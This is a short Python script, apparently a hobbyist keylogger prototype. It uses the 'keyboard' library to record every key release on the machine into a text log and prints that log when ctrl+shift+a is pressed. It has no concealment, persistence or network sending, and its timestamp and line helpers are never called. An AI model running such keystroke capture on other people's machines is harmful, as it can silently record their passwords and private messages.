import keyboard
from datetime import datetime, date



class Logger:

    def __init__(self):
        self.log = ""
        self.line = ""
        self.line_length = 50

    def callback(self, event):
        """When a stroke happen this function is called"""

        name = event.name

        exception_key = ["backspace", "delete", "left", "right", "up", "down", "shift",
                         "ctrl", "right shift", "alt", "tab", ]
        # print(name)

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name in exception_key:
                name = ""

        self.log += name

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait(hotkey='ctrl+shift+a')
        print(self.log)

    def count_line(self):
        """Take a line and return True if it's become too long"""

        if len(self.line) >= self.line_length:
            self.log += "\n" + self.line
            self.line = ""

    def add_timestamp(self):
        """Take the line and add time stamp"""

        now = datetime.now()
        time_string = now.strftime("%Y-%m-%d %H:%M:%S")
        self.line = time_string + ":  " + self.line


if __name__ == '__main__':

    a = Logger()
    a.start()


